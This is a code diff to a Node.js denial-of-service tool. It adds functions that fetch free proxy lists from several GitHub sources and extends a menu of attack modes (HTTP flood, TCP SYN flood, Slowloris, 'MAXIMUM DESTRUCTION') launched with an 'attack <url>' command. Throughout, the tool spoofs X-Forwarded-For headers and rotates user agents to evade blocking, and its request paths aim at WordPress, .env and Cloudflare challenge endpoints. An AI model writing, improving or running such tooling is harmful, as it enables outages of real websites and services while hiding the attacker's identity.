@@ -33,16 +33,65 @@ const ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0','Mozill
 const paths = ['/', '/wp-admin/admin-ajax.php', '/xmlrpc.php', '/index.php', '/login', '/api', '/.env', '/config.php', '/cdn-cgi/challenge-platform/h/g/flow'];
 
 function loadProxies() {
-    try { proxies = [...new Set(fs.readFileSync('proxy.txt','utf-8').split('\n').filter(l=>l.trim()&&!l.startsWith('#')))]; console.log(`${c.green}✓${c.reset} ${c.cyan}Loaded ${c.yellow}${proxies.length}${c.cyan} proxies${c.reset}\n`); } 
-    catch(e) { console.log(`${c.yellow}⚠ No proxy.txt${c.reset}\n`); }
+    try { 
+        proxies = [...new Set(fs.readFileSync('proxy.txt','utf-8').split('\n').filter(l=>l.trim()&&!l.startsWith('#')))];
+        console.log(`${c.green}✓${c.reset} ${c.cyan}Loaded ${c.yellow}${proxies.length}${c.cyan} proxies ready${c.reset}\n`);
+        return proxies.length;
+    } catch(e) { 
+        console.log(`${c.yellow}⚠ No proxy.txt found. Running without proxies.${c.reset}\n`);
+        return 0;
+    }
 }
 
 function downloadProxies() {
-    console.log(`${c.cyan}📥 Downloading proxies...${c.reset}`);
+    console.log(`${c.cyan}📥 Downloading fresh proxies...${c.reset}`);
     const https = require('https');
     let all = [], done = 0;
     ['https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt','https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt','https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt'].forEach(src=>{
         https.get(src,res=>{let d=''; res.on('data',ch=>d+=ch); res.on('end',()=>{all.push(...d.split('\n').filter(l=>l.trim())); done++; if(done===3){all=[...new Set(all)]; fs.writeFileSync('proxy.txt',all.join('\n')); console.log(`${c.green}✓ Downloaded ${all.length} proxies${c.reset}\n`); loadProxies();}});}).on('error',()=>done++);
+    });
+}
+
+function refreshProxies() {
+    console.log(`${c.cyan}🔄 Refreshing MostStable proxies...${c.reset}`);
+    const https = require('https');
+    const url = 'https://raw.githubusercontent.com/proxygenerator1/ProxyGenerator/main/MostStable/http.txt';
+    https.get(url, (res) => {
+        let data = '';
+        res.on('data', chunk => data += chunk);
+        res.on('end', () => {
+            const prox = data.split('\n').filter(l => l.trim());
+            fs.writeFileSync('proxy.txt', prox.join('\n'));
+            console.log(`${c.green}✓ Downloaded ${prox.length} MostStable proxies${c.reset}`);
+            loadProxies();
+        });
+    }).on('error', (err) => console.log(`${c.red}✗ Failed: ${err.message}${c.reset}`));
+}
+
+function refreshProxiesMulti() {
+    console.log(`${c.cyan}🔄 Downloading from 3 sources...${c.reset}`);
+    const https = require('https');
+    const sources = [
+        'https://raw.githubusercontent.com/proxygenerator1/ProxyGenerator/main/MostStable/http.txt',
+        'https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/all.txt',
+        'https://raw.githubusercontent.com/gfpcom/free-proxy-list/refs/heads/wiki/lists/http.txt'
+    ];
+    let all = [], done = 0;
+    sources.forEach(src => {
+        https.get(src, res => {
+            let data = '';
+            res.on('data', chunk => data += chunk);
+            res.on('end', () => {
+                all.push(...data.split('\n').filter(l => l.trim()));
+                done++;
+                if (done === sources.length) {
+                    all = [...new Set(all)];
+                    fs.writeFileSync('proxy.txt', all.join('\n'));
+                    console.log(`${c.green}✓ Downloaded ${all.length} total proxies${c.reset}`);
+                    loadProxies();
+                }
+            });
+        }).on('error', () => done++);
     });
 }
 
@@ -52,8 +101,7 @@ function getHeaders() {
     return { 
         'User-Agent': ua[Math.floor(Math.random()*ua.length)], 
         'Accept': '*/*', 'Cache-Control': 'no-cache', 'Connection': 'keep-alive',
-        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
-        'X-Originating-IP': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
+        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
     };
 }
 
@@ -127,9 +175,11 @@ ${c.red}${c.bold}╔════════════════════
 ║  ${c.green}4. TCP SYN Flood   ${c.cyan}- Raw connection flood                   ║
 ║  ${c.green}5. Slowloris       ${c.cyan}- Slow headers attack                    ║
 ║  ${c.green}6. ALL METHODS     ${c.red}- MAXIMUM DESTRUCTION                     ║
-║  ${c.green}7. Download Proxies${c.cyan}- Update proxy list                       ║
-║  ${c.green}8. Stop Attack     ${c.cyan}- Stop current attack                    ║
-║  ${c.green}9. Exit            ${c.cyan}- Close tool                             ║
+║  ${c.green}7. Download Proxies${c.cyan}- Update proxy (standard)                ║
+║  ${c.green}8. Refresh Proxies ${c.cyan}- MostStable proxies (lebih awet)       ║
+║  ${c.green}9. Refresh Multi   ${c.cyan}- From 3 sources (ribuan proxy)         ║
+║  ${c.green}10. Stop Attack    ${c.cyan}- Stop current attack                    ║
+║  ${c.green}11. Exit           ${c.cyan}- Close tool                             ║
 ╠════════════════════════════════════════════════════════════╣
 ║  ${c.yellow}💀 COMMAND: attack <url> <method> <duration> <proxy>${c.red}          ║
 ║  ${c.yellow}💀 EXAMPLE: attack http://target.com all 60 yes${c.red}               ║
@@ -149,9 +199,12 @@ rl.on('line', (input) => {
         if(isNaN(duration)) console.log(`${c.red}❌ Invalid duration${c.reset}\n`);
         else if(!['http','post','udp','tcp','slow','all'].includes(method)) console.log(`${c.red}❌ Invalid method${c.reset}\n`);
         else start(target, method, duration, useProxy);
-    } else if(cmd==='stop') { active=false; console.log(`${c.red}🛑 Attack stopped by user${c.reset}\n`); }
-    else if(cmd==='download-proxy') downloadProxies();
+    } 
+    else if(cmd==='stop' || cmd==='10') { active=false; console.log(`${c.red}🛑 Attack stopped${c.reset}\n`); }
+    else if(cmd==='download-proxy' || cmd==='7') downloadProxies();
+    else if(cmd==='refresh' || cmd==='8') refreshProxies();
+    else if(cmd==='refresh-multi' || cmd==='9') refreshProxiesMulti();
     else if(cmd==='menu'||cmd==='help') showMenu();
-    else if(cmd==='exit') process.exit(0);
+    else if(cmd==='exit'||cmd==='11') process.exit(0);
     rl.prompt();
 });
